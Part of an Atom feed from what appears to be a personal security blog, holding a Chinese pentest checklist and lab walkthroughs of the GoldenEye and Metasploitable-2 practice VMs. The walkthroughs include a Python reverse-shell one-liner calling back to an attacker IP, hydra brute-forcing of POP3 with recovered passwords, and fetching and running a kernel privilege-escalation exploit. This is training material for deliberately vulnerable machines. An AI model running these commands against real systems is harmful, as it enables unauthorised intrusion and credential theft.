+        <id>https://yidwfnyetg.github.io/post/common-process-for-handling-objectives/</id>
+        <link href="https://yidwfnyetg.github.io/post/common-process-for-handling-objectives/">
+        </link>
+        <updated>2023-02-02T08:30:13.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="1-nmap基本扫描">1、Nmap基本扫描</h1>
+<p><code>nmap -Pn -p- -vv</code><br>
+<code>nmap -Pn -p- -sU -vv</code></p>
+<hr>
+<h1 id="2-针对端口指纹和漏洞的扫描">2、针对端口指纹和漏洞的扫描</h1>
+<p><code>Nmap -Pn -sV -O -pT:{TCP ports found in step 1},U:{UDP ports found in step 1} -script vuln &lt;ip address&gt;</code><br>
+使用nc查看banner<br>
+<code>nc -nv &lt;ip-address&gt; &lt;port&gt;</code></p>
+<hr>
+<h1 id="3-针对-web-端口的枚举">3、针对 web 端口的枚举</h1>
+<p><code>Nikto -port {web ports} -host &lt;ip address&gt; -o &lt;output file.txt&gt;</code><br>
+目录扫描<br>
+<code>Dirb http{s}://&lt;ip address&gt;:&lt;port&gt; /usr/share/wordlist/dirb/{common/small/vulns}.txt</code><br>
+<code>Gobuster -u http://&lt;ip-address&gt; -w /usr/share/Seclists/Discovery/Web_Content/common.txt</code><br>
+如果想测试文件包含漏洞，可以使用 fimap：<br>
+<code>fimap -u &lt;ip-address&gt;</code></p>
+<hr>
+<h1 id="4-针对已知的服务进行攻击尝试搜索漏洞信息">4、针对已知的服务进行攻击尝试，搜索漏洞信息</h1>
+<p><code>Searchsploit &lt;service name&gt;</code><br>
+漏洞来源：<br>
+<a href="https://www.securityfocus.com/vulnerabilities">https://www.securityfocus.com/vulnerabilities</a></p>
+<hr>
+<h1 id="5-针对-web-页面的测试">5、针对 web 页面的测试</h1>
+<p>检查页面信息，审查元素、查看 cookie、tamper 数据、可以使用 curl/wget<br>
+在线搜索资源（比如 github），如果应用程序是开源的，根据网站枚举的信息猜测版本，然后找出可能存在的风险<br>
+检查 HTTP 选项<br>
+测试输入表单参数（比如 1' or 1=1 limit 1; # AND 1' or 1=1--）<br>
+● NULL 或 null<br>
+● ', &quot;, ;, &lt;!<br>
+○ 中断 SQL 字符串或查询，常用于 SQL、XPath、XML 注入<br>
+● -, =, +, &quot;<br>
+○ 用于手工 SQL 注入测试<br>
+● ', &amp;, ! , ¦ , &lt; , &gt;<br>
+○ 用于找出命令执行漏洞<br>
+● ../<br>
+○ 目录穿越漏洞</p>
+<hr>
+<h1 id="6-针对-netbios-smb-rpc-端口的测试">6、针对 NETBIOS、SMB、RPC 端口的测试</h1>
+<p><code>enum4linux -a &lt;ip address&gt; Rpcclient &lt;ip address&gt; -U &quot;&quot; -N Rpcinfo -p &lt;target ip&gt;</code><br>
+关于 RPC 历史漏洞的合集：<br>
+http://etutorials.org/Networking/network+security+assessment/Chapter+12.+Assessing+Unix+RPC+Services/12.2+RPC+Service+Vulnerabilities/<br>
+以下是常用的远程测试命令<br>
+<code>Showmount -e &lt;ip address&gt;/&lt;port&gt; </code><br>
+<code>Mount -t cifs //&lt;server ip&gt;/&lt;share&gt; &lt;local dir&gt; -o username=”guest”,password=”” </code><br>
+<code>Rlogin &lt;ip-address&gt; Smbclient -L &lt;ip-address&gt; -U “” -N Nbtscan -r &lt;ip address&gt; </code><br>
+<code>Net use &lt;ip-address&gt;$Share “” /u:”” </code><br>
+<code>Net view &lt;ip-address&gt;</code><br>
+还可以使用 NMAP 的脚本测试 SMB、DCERPC、NETBIOS</p>
+<hr>
+<h1 id="7-针对-smtp-端口的尝试">7、针对 SMTP 端口的尝试</h1>
+<p>枚举用户，使用 VRFY 和 EXPN 命令</p>
+<hr>
+<h1 id="8-针对-snmp-端口的测试">8、针对 SNMP 端口的测试</h1>
+<p>默认共享名称如：public, private, cisco, manager<br>
+使用工具：<br>
+<code>Onesixtyone –c &lt;community list file&gt; -I &lt;ip-address&gt; Snmpwalk -c &lt;community string&gt; -v&lt;version&gt; &lt;ip address&gt;</code><br>
+默认 MIB：<br>
+1.3.6.1.2.1.25.1.6.0 System Processes 1.3.6.1.2.1.25.4.2.1.2 Running Programs 1.3.6.1.2.1.25.4.2.1.4 Processes Path 1.3.6.1.2.1.25.2.3.1.4 Storage Units 1.3.6.1.2.1.25.6.3.1.2 Software Name 1.3.6.1.4.1.77.1.2.25 User Accounts 1.3.6.1.2.1.6.13.1.3 TCP Local Ports<br>
+比如枚举运行的进程<br>
+<code>nmpwalk -c public -v1 192.168.11.204 1.3.6.1.2.1.25.4.2.1.2</code></p>
+<hr>
+<h1 id="9-针对-ftp-端口测试">9、针对 FTP 端口测试</h1>
+<p>● anonymous 是否可以登录<br>
+● 如果可以登录是否可以使用 get 或 send 操作文件<br>
+● 使用浏览器是否可以访问，ftp://<ip-address></p>
+<hr>
+<h1 id="10-密码破解">10、密码破解</h1>
+<p>在 linux 下可以使用 unshadow 命令合并 passwd 和 shadow 文件：<br>
+<code>unshadow [passwd-file] [shadow-file] &gt; unshadowed.txt</code><br>
+可以使用的 hash-identifier 识别 hash 类型，使用 hashcat 破解 hash<br>
+<code>hashcat -m 400 -a 0 &lt;hash file&gt; &lt;wordlist file&gt;</code><br>
+对于其他服务，可以使用 Medusa 或 hydra<br>
+<code>Hydra -L &lt;username file&gt; -P &lt;Password file&gt; -v &lt;ip-address&gt; ssh </code><br>
+<code>Medusa -h &lt;ip-address&gt; -U &lt;username file&gt; -P &lt;password file&gt; -M http -m DIR:/admin -T 30</code></p>
+<hr>
+<h1 id="11-数据包抓取">11、数据包抓取</h1>
+<p>使用 wireshark / tcpdump 获取目标主机的流量<br>
+<code>“tcpdump -i tap0 host tcp port 80 and not arp and not icmp -vv”</code></p>
+<hr>
+<h1 id="参考资料">参考资料</h1>
+<p>NMAP Cheatsheet<br>
+<a href="https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf">https://blogs.sans.org/pen-testing/files/2013/10/NmapCheatSheetv1.1.pdf</a><br>
+Exploit-DB<br>
+<a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a><br>
+Kernel Exploits<br>
+<a href="https://www.kernel-exploits.com/">https://www.kernel-exploits.com/</a><br>
+Privilege Escalation Linux<br>
+<a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a><br>
+&lt;Linux Pentest Commands<br>
+<a href="http://www.networkpentest.net/p/linuxunix-command-list.html">http://www.networkpentest.net/p/linuxunix-command-list.html</a><br>
+Windows Command Line Cheatsheet<br>
+<a href="https://www.sans.org/security-resources/sec560/windows_command_line_sheet_v1.pdf">https://www.sans.org/security-resources/sec560/windows_command_line_sheet_v1.pdf</a><br>
+Privilege Escalation Windows:<br>
+<a href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a><br>
+<a href="http://toshellandback.com/2015/11/24/ms-priv-esc/">http://toshellandback.com/2015/11/24/ms-priv-esc/</a><br>
+Windows Priv Esc cheatsheet<br>
+<a href="http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html">http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html</a><br>
+Pentest References:<br>
+<a href="http://www.vulnerabilityassessment.co.uk/">http://www.vulnerabilityassessment.co.uk/</a><br>
+<a href="http://www.0daysecurity.com/penetration-testing/enumeration.html">http://www.0daysecurity.com/penetration-testing/enumeration.html</a><br>
+Reverse Shell:<br>
+<a href="https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/">https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/</a><br>
+<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a><br>
+<a href="http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html">http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html</a><br>
+<a href="http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/">http://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/</a><br>
+Shell Escape:<br>
+<a href="https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells">https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells</a><br>
+Pentestmonkey Cheat Sheets (SQL Injection)<br>
+<a href="http://pentestmonkey.net/category/cheat-sheet">http://pentestmonkey.net/category/cheat-sheet</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[GodenEye]]></title>
+        <id>https://yidwfnyetg.github.io/post/godeneye/</id>
+        <link href="https://yidwfnyetg.github.io/post/godeneye/">
+        </link>
+        <updated>2023-02-02T07:54:31.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="information-gathering">Information gathering</h1>
+<pre><code>netdiscover -r 192.168.124.0/24
+nmap  -sV -O -Pn -T4 192.168.124.44 -p-
+nmap --script vuln 192.168.124.44 -p-
+dirb http://192.168.124.44:80/ /usr/share/wordlists/dirb/big.txt
+</code></pre>
+<p>The nmap scanning result is as enclosure.<br>
+The dirb found nothing.</p>
+<hr>
+<h1 id="method-1">Method-1</h1>
+<h2 id="step-1-intrude-the-login-pagefailed">step-1 Intrude the login page(failed)</h2>
+<p><img src="https://yidwfnyetg.github.io/post-images/1675389865498.png" alt="" loading="lazy"><br>
+<img src="https://yidwfnyetg.github.io/post-images/1675389870691.png" alt="" loading="lazy"><br>
+I find its login page,try to intrude it.<br>
+Authorization is made up of user:password.<br>
+<img src="https://yidwfnyetg.github.io/post-images/1675389847203.png" alt="" loading="lazy"><br>
+<img src="https://yidwfnyetg.github.io/post-images/1675390018821.png" alt="" loading="lazy"><br>
+<img src="https://yidwfnyetg.github.io/post-images/1675390162371.png" alt="" loading="lazy"><br>
+Find nothing.</p>
+<h2 id="step-2-view-home-page-source">step-2 View home page source.</h2>
+<p><img src="https://yidwfnyetg.github.io/post-images/1675390345344.png" alt="" loading="lazy"><br>
+<img src="https://yidwfnyetg.github.io/post-images/1675390355645.png" alt="" loading="lazy"><br>
+<code>&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</code><br>
+<img src="https://yidwfnyetg.github.io/post-images/1675390815369.png" alt="" loading="lazy"><br>
+It's unicode,decode it as html,I get 'InvincibleHack3r'.And in source page,i known that the user is boris.Attention please,'boris' not 'Boris'.<br>
+<img src="https://yidwfnyetg.github.io/post-images/1675391828534.png" alt="" loading="lazy"></p>
+<p>View source code of this page.In the end i find an explanatory note.<br>
+<img src="https://yidwfnyetg.github.io/post-images/1675391692695.png" alt="" loading="lazy"></p>
+<h2 id="step-3-pop3">step-3 POP3</h2>
+<p>From nmap result,55007 is pop3 port.<br>
+<img src="https://yidwfnyetg.github.io/post-images/1675393082037.png" alt="" loading="lazy"><br>
+Use burpsuite to send packet.It response us slowly,be pacient.<br>
+Intrude pop3 password.I guess its username is 'natalya' or 'boris'.</p>
+<pre><code>hydra -s 55007 -L username.txt  -P /usr/share/set/src/fasttrack/wordlist.txt -e nsr -t 22 192.168.124.44 pop3
+</code></pre>
+<p>Then I get password.Attention,intrude it successfully only with /usr/share/set/src/fasttrack/wordlist.txt.<br>
+<code>natalya:bird</code><br>
+<code>boris:secret1!</code></p>
+<h2 id="step-4-login-mailbox">step-4 Login mailbox</h2>
+<pre><code>telnet 192.168.124.44 55007
+
+user natalya
+pass bird
+
+list
++OK 2 messages:
+1 631
+2 1048
+.
+
+retr 1
+</code></pre>
+<p>I find two mails.And the second is critical.<br>
+<img src="https://yidwfnyetg.github.io/post-images/1675394170762.png" alt="" loading="lazy"><br>
+<img src="https://yidwfnyetg.github.io/post-images/1675394314719.png" alt="" loading="lazy"></p>
+<h2 id="step-5-login-in-gnocertdir">step-5 Login in gnocertdir</h2>
+<p>Edit /etc/hosts<br>
+<img src="https://yidwfnyetg.github.io/post-images/1675394962917.png" alt="" loading="lazy"><br>
+Visit servernaya-station.com/gnocertdir<br>
+<img src="https://yidwfnyetg.github.io/post-images/1675395021833.png" alt="" loading="lazy"><br>
+The username and password has be shown in the second mail.<br>
+I find a mail of doak.Try to intrude doak's mailbox.<br>
+Then Get doak:goat<br>
+<img src="https://yidwfnyetg.github.io/post-images/1675395868856.png" alt="" loading="lazy"><br>
+Find another account of this system in doak's mailbox.<br>
+username: dr_doak<br>
+password: 4England!<br>
+Sign in system with this account.<br>
+I find a file named secret.txt.<br>
+<img src="https://yidwfnyetg.github.io/post-images/1675396334057.png" alt="" loading="lazy"><br>
+Download picture for-007.jpg<br>
+Open this picture in notepad++,something intersting show.<br>
+<img src="https://yidwfnyetg.github.io/post-images/1675396627851.png" alt="" loading="lazy"><br>
+Decode 'eFdpbnRlcjE5OTV4IQ==',get 'xWinter1995x!'</p>
+<h2 id="step-6-moodlecms-exploitation">step-6 Moodlecms exploitation</h2>
+<p>xWinter1995x! is the password of admin<br>
+The version of moodle cms is 2.2.3<br>
+<img src="https://yidwfnyetg.github.io/post-images/1675845464385.png" alt="" loading="lazy"><br>
+It seems that we can use msf to get shell.<br>
+Before exploit it,set text editor.<br>
+<img src="https://yidwfnyetg.github.io/post-images/1675905870571.png" alt="" loading="lazy"><br>
+<img src="https://yidwfnyetg.github.io/post-images/1675905558594.png" alt="" loading="lazy"></p>
+<h2 id="step-7-privilege-escalation">Step-7 Privilege escalation</h2>
+<p>It's www-data now<br>
+Search vulnerability to escalate privilege.</p>
+<pre><code>searchsploit linux ubuntu 3.13
+</code></pre>
+<p><img src="https://yidwfnyetg.github.io/post-images/1675906171442.png" alt="" loading="lazy"><br>
+Use 37292.c<br>
+The absolute path of shellcode is /usr/share/exploitdb/exploits/<br>
+move it to /home/kali<br>
+edit  37292.c,because there is no gcc in  target host .Use cc<br>
+<img src="https://yidwfnyetg.github.io/post-images/1675911223227.png" alt="" loading="lazy"></p>
+<p>change shell to meterpreter</p>
+<pre><code>use post/multi/manage/shell_to_meterpreter
+set session 1
+exploit
+sessions -i 2
+upload 37292.c
+shell
+</code></pre>
+<p>How to use 37292.c will be described in it's code.</p>
+<pre><code>chmod 777 37292.c
+cc -o exp 37292.c
+./exp
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://yidwfnyetg.github.io/post-images/1675912183070.png" alt="" loading="lazy"></figure>
+<hr>
+<h1 id="method-2-reverse-shell">Method-2 Reverse shell</h1>
+<h2 id="step-6-moodlecms-exploitation-2">Step-6 Moodlecms exploitation</h2>
+<p>In 'Site administration-Server-System paths',I find a web which can be used to upload shellcode.</p>
+<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.124.4&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
+</code></pre>
+<p><img src="https://yidwfnyetg.github.io/post-images/1675912534581.png" alt="" loading="lazy"><br>
+listen port 6666 in vps.<br>
+<code>nc lvnp 6666</code><br>
+check spell<br>
+<img src="https://yidwfnyetg.github.io/post-images/1675912972431.png" alt="" loading="lazy"><br>
+Then will get a shell<br>
+<img src="https://yidwfnyetg.github.io/post-images/1675913050473.png" alt="" loading="lazy"></p>
+<h2 id="step-7-privilege-escalation-2">Step-7 Privilege escalation</h2>
+<p>Turn shell to python shell</p>
+<pre><code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)' 
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://yidwfnyetg.github.io/post-images/1675914702007.png" alt="" loading="lazy"></figure>
+<pre><code>python3 -m http.server 5555
+</code></pre>
+<p>In the shell<br>
+<code>wget http://192.168.124.5:5555/37292.c</code></p>
+<hr>
+<h1 id="enclosure">Enclosure</h1>
+<p><img src="https://yidwfnyetg.github.io/post-images/1675329659408.png" alt="" loading="lazy"><br>
+<img src="https://yidwfnyetg.github.io/post-images/1675329715883.png" alt="" loading="lazy"></p>
+<pre><code>Not shown: 65531 closed tcp ports (reset)
+PORT      STATE SERVICE
+25/tcp    open  smtp
+| smtp-vuln-cve2010-4344: 
+|_  The SMTP server is not Exim: NOT VULNERABLE
+| ssl-dh-params: 
+|   VULNERABLE:
+|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability
+|     State: VULNERABLE
+|       Transport Layer Security (TLS) services that use anonymous
+|       Diffie-Hellman key exchange only provide protection against passive
+|       eavesdropping, and are vulnerable to active man-in-the-middle attacks
+|       which could completely compromise the confidentiality and integrity
+|       of any data exchanged over the resulting session.
+|     Check results:
+|       ANONYMOUS DH GROUP 1
+|             Cipher Suite: TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA
+|             Modulus Type: Safe prime
+|             Modulus Source: Unknown/Custom-generated
+|             Modulus Length: 512
+|             Generator Length: 8
+|             Public Key Length: 512
+|     References:
+|       https://www.ietf.org/rfc/rfc2246.txt
+|   
+|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)
+|     State: VULNERABLE
+|     IDs:  BID:74733  CVE:CVE-2015-4000
+|       The Transport Layer Security (TLS) protocol contains a flaw that is
+|       triggered when handling Diffie-Hellman key exchanges defined with
+|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker
+|       to downgrade the security of a TLS session to 512-bit export-grade
+|       cryptography, which is significantly weaker, allowing the attacker
+|       to more easily break the encryption and monitor or tamper with
+|       the encrypted stream.
+|     Disclosure date: 2015-5-19
+|     Check results:
+|       EXPORT-GRADE DH GROUP 1
+|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
+|             Modulus Type: Safe prime
+|             Modulus Source: Unknown/Custom-generated
+|             Modulus Length: 512
+|             Generator Length: 8
+|             Public Key Length: 512
+|     References:
+|       https://weakdh.org
+|       https://www.securityfocus.com/bid/74733
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000
+|   
+|   Diffie-Hellman Key Exchange Insufficient Group Strength
+|     State: VULNERABLE
+|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
+|       of insufficient strength, especially those using one of a few commonly
+|       shared groups, may be susceptible to passive eavesdropping attacks.
+|     Check results:
+|       WEAK DH GROUP 1
+|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
+|             Modulus Type: Safe prime
+|             Modulus Source: postfix builtin
+|             Modulus Length: 1024
+|             Generator Length: 8
+|             Public Key Length: 1024
+|     References:
+|_      https://weakdh.org
+| ssl-poodle: 
+|   VULNERABLE:
+|   SSL POODLE information leak
+|     State: VULNERABLE
+|     IDs:  BID:70574  CVE:CVE-2014-3566
+|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
+|           products, uses nondeterministic CBC padding, which makes it easier
+|           for man-in-the-middle attackers to obtain cleartext data via a
+|           padding-oracle attack, aka the &quot;POODLE&quot; issue.
+|     Disclosure date: 2014-10-14
+|     Check results:
+|       TLS_RSA_WITH_AES_128_CBC_SHA
+|     References:
+|       https://www.securityfocus.com/bid/70574
+|       https://www.imperialviolet.org/2014/10/14/poodle.html
+|       https://www.openssl.org/~bodo/ssl-poodle.pdf
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
+80/tcp    open  http
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-slowloris-check: 
+|   VULNERABLE:
+|   Slowloris DOS attack
+|     State: LIKELY VULNERABLE
+|     IDs:  CVE:CVE-2007-6750
+|       Slowloris tries to keep many connections to the target web server open and hold
+|       them open as long as possible.  It accomplishes this by opening connections to
+|       the target web server and sending a partial request. By doing so, it starves
+|       the http server's resources causing Denial Of Service.
+|       
+|     Disclosure date: 2009-09-17
+|     References:
+|       http://ha.ckers.org/slowloris/
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+55006/tcp open  unknown
+| ssl-poodle: 
+|   VULNERABLE:
+|   SSL POODLE information leak
+|     State: VULNERABLE
+|     IDs:  BID:70574  CVE:CVE-2014-3566
+|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
+|           products, uses nondeterministic CBC padding, which makes it easier
+|           for man-in-the-middle attackers to obtain cleartext data via a
+|           padding-oracle attack, aka the &quot;POODLE&quot; issue.
+|     Disclosure date: 2014-10-14
+|     Check results:
+|       TLS_RSA_WITH_AES_128_CBC_SHA
+|     References:
+|       https://www.securityfocus.com/bid/70574
+|       https://www.imperialviolet.org/2014/10/14/poodle.html
+|       https://www.openssl.org/~bodo/ssl-poodle.pdf
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
+| ssl-dh-params: 
+|   VULNERABLE:
+|   Diffie-Hellman Key Exchange Insufficient Group Strength
+|     State: VULNERABLE
+|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
+|       of insufficient strength, especially those using one of a few commonly
+|       shared groups, may be susceptible to passive eavesdropping attacks.
+|     Check results:
+|       WEAK DH GROUP 1
+|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
+|             Modulus Type: Safe prime
+|             Modulus Source: Unknown/Custom-generated
+|             Modulus Length: 1024
+|             Generator Length: 8
+|             Public Key Length: 1024
+|     References:
+|_      https://weakdh.org
+55007/tcp open  unknown
+MAC Address: 00:0C:29:8D:FC:67 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 323.07 seconds
+</code></pre>
+<hr>
+<h1 id="command-summary">Command Summary</h1>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Metasploitable-2]]></title>
+        <id>https://yidwfnyetg.github.io/post/metasploitable-2/</id>
+        <link href="https://yidwfnyetg.github.io/post/metasploitable-2/">
+        </link>
+        <updated>2023-02-02T03:06:54.000Z</updated>
+        <content type="html"><![CDATA[<p>Information Gathering</p>
+<pre><code>netdiscover -r 192.168.124.0/24
+sudo nmap -sV -O -Pn -T4 192.168.124.32 -p-
+nmap --script vuln 192.168.124.32 -p- 
+</code></pre>
+<p>The scanning result is as enclosure.</p>
+<hr>
+<h1 id="mehod1cve-2007-2447">Mehod1:CVE-2007-2447</h1>
+<p>Same as metasploitable-1,method1</p>
+<hr>
+<h1 id="method2cve-2011-2523">Method2:CVE-2011-2523</h1>
+<p><img src="https://yidwfnyetg.github.io/post-images/1675307808514.gif" alt="" loading="lazy"><br>
+<img src="https://yidwfnyetg.github.io/post-images/1675307841182.gif" alt="" loading="lazy"><br>
+<img src="https://yidwfnyetg.github.io/post-images/1675307847800.gif" alt="" loading="lazy"><br>
+it's &quot;root&quot; user<br>
+<img src="https://yidwfnyetg.github.io/post-images/1675307860348.gif" alt="" loading="lazy"></p>
+<hr>
+<h1 id="method3cve-2004-2687">Method3:CVE-2004-2687</h1>
+<p><img src="https://yidwfnyetg.github.io/post-images/1675307882873.gif" alt="" loading="lazy"><br>
+<img src="https://yidwfnyetg.github.io/post-images/1675307890322.gif" alt="" loading="lazy"><br>
+Privilege escalation is as follows<br>
+change shell to meterpreter<br>
+<img src="https://yidwfnyetg.github.io/post-images/1675307945242.gif" alt="" loading="lazy"><br>
+Execute commond as follows:</p>
+<pre><code>set sessoin 1
+exploit 
+sessions -i 2
+shell
+upload linux-exploit-suggester
+</code></pre>
+<p><img src="https://yidwfnyetg.github.io/post-images/1675307951578.gif" alt="" loading="lazy"><br>
+Remember add implement privilege to what you upload<br>
+<img src="https://yidwfnyetg.github.io/post-images/1675307968824.gif" alt="" loading="lazy"><br>
+<img src="https://yidwfnyetg.github.io/post-images/1675307977375.gif" alt="" loading="lazy"><br>
+Try to escalate privilege by CVE-2018-14665<br>
+<img src="https://yidwfnyetg.github.io/post-images/1675307983061.gif" alt="" loading="lazy"><br>
+Failed,What a pity.<br>
+Use the method in previous hub.<br>
+<img src="https://yidwfnyetg.github.io/post-images/1675307989107.gif" alt="" loading="lazy"><br>
+remove the suffix name of the public key,then it's the private key.<br>
+<img src="https://yidwfnyetg.github.io/post-images/1675308017931.gif" alt="" loading="lazy"></p>
+<hr>
+<h1 id="method4cve-2012-1823">Method4:CVE-2012-1823</h1>
+<p><img src="https://yidwfnyetg.github.io/post-images/1675308052350.gif" alt="" loading="lazy"><br>
+<img src="https://yidwfnyetg.github.io/post-images/1675308066038.gif" alt="" loading="lazy"><br>
+Need privilege escalaion again</p>
+<hr>
+<h1 id="enclosure">Enclosure</h1>
+<p>┌──(kali㉿kali)-[~]<br>
+└─$ nmap --script vuln 192.168.124.32 -p-<br>
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-03 21:54 EDT<br>
+Nmap scan report for bogon (192.168.124.32)<br>
+Host is up (0.0020s latency).<br>
+Not shown: 65505 closed tcp ports (conn-refused)<br>
+PORT      STATE SERVICE<br>
+21/tcp    open  ftp<br>
+| ftp-vsftpd-backdoor:<br>
+|   VULNERABLE:<br>
+|   vsFTPd version 2.3.4 backdoor<br>
+|     State: VULNERABLE (Exploitable)<br>
+|     IDs:  BID:48539  CVE:CVE-2011-2523<br>
+|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.<br>
+|     Disclosure date: 2011-07-03<br>
+|     Exploit results:<br>
+|       Shell command: id<br>
+|       Results: uid=0(root) gid=0(root)<br>
+|     References:<br>
+|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb<br>
+|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html<br>
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523<br>
+|_      https://www.securityfocus.com/bid/48539<br>
+22/tcp    open  ssh<br>
+23/tcp    open  telnet<br>
+25/tcp    open  smtp<br>
+| ssl-poodle:<br>
+|   VULNERABLE:<br>
+|   SSL POODLE information leak<br>
+|     State: VULNERABLE<br>
+|     IDs:  BID:70574  CVE:CVE-2014-3566<br>
+|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other<br>
+|           products, uses nondeterministic CBC padding, which makes it easier<br>
+|           for man-in-the-middle attackers to obtain cleartext data via a<br>
+|           padding-oracle attack, aka the &quot;POODLE&quot; issue.<br>
+|     Disclosure date: 2014-10-14<br>
+|     Check results:<br>
+|       TLS_RSA_WITH_AES_128_CBC_SHA<br>
+|     References:<br>
+|       https://www.securityfocus.com/bid/70574<br>
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566<br>
+|       https://www.imperialviolet.org/2014/10/14/poodle.html<br>
+|_      https://www.openssl.org/~bodo/ssl-poodle.pdf<br>
+|<em>sslv2-drown: ERROR: Script execution failed (use -d to debug)<br>
+| smtp-vuln-cve2010-4344:<br>
+|</em>  The SMTP server is not Exim: NOT VULNERABLE<br>
+| ssl-dh-params:<br>
+|   VULNERABLE:<br>
+|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability<br>
+|     State: VULNERABLE<br>
+|       Transport Layer Security (TLS) services that use anonymous<br>
+|       Diffie-Hellman key exchange only provide protection against passive<br>
+|       eavesdropping, and are vulnerable to active man-in-the-middle attacks<br>
+|       which could completely compromise the confidentiality and integrity<br>
+|       of any data exchanged over the resulting session.<br>
+|     Check results:<br>
+|       ANONYMOUS DH GROUP 1<br>
+|             Cipher Suite: TLS_DH_anon_WITH_3DES_EDE_CBC_SHA<br>
+|             Modulus Type: Safe prime<br>
+|             Modulus Source: postfix builtin<br>
+|             Modulus Length: 1024<br>
+|             Generator Length: 8<br>
+|             Public Key Length: 1024<br>
+|     References:<br>
+|       https://www.ietf.org/rfc/rfc2246.txt<br>
+|<br>
+|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)<br>
+|     State: VULNERABLE<br>
+|     IDs:  BID:74733  CVE:CVE-2015-4000<br>
+|       The Transport Layer Security (TLS) protocol contains a flaw that is<br>
+|       triggered when handling Diffie-Hellman key exchanges defined with<br>
+|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker<br>
+|       to downgrade the security of a TLS session to 512-bit export-grade<br>
+|       cryptography, which is significantly weaker, allowing the attacker<br>
+|       to more easily break the encryption and monitor or tamper with<br>
+|       the encrypted stream.<br>
+|     Disclosure date: 2015-5-19<br>
+|     Check results:<br>
+|       EXPORT-GRADE DH GROUP 1<br>
+|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA<br>
+|             Modulus Type: Safe prime<br>
+|             Modulus Source: Unknown/Custom-generated<br>
+|             Modulus Length: 512<br>
+|             Generator Length: 8<br>
+|             Public Key Length: 512<br>
+|     References:<br>
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000<br>
+|       https://www.securityfocus.com/bid/74733<br>
+|       https://weakdh.org<br>
+|<br>
+|   Diffie-Hellman Key Exchange Insufficient Group Strength<br>
+|     State: VULNERABLE<br>
+|       Transport Layer Security (TLS) services that use Diffie-Hellman groups<br>
+|       of insufficient strength, especially those using one of a few commonly<br>
+|       shared groups, may be susceptible to passive eavesdropping attacks.<br>
+|     Check results:<br>
+|       WEAK DH GROUP 1<br>
+|             Cipher Suite: TLS_DHE_RSA_WITH_DES_CBC_SHA<br>
+|             Modulus Type: Safe prime<br>
+|             Modulus Source: postfix builtin<br>
+|             Modulus Length: 1024<br>
+|             Generator Length: 8<br>
+|             Public Key Length: 1024<br>
+|     References:<br>
+|_      https://weakdh.org<br>
+53/tcp    open  domain<br>
+80/tcp    open  http<br>
+| http-enum:<br>
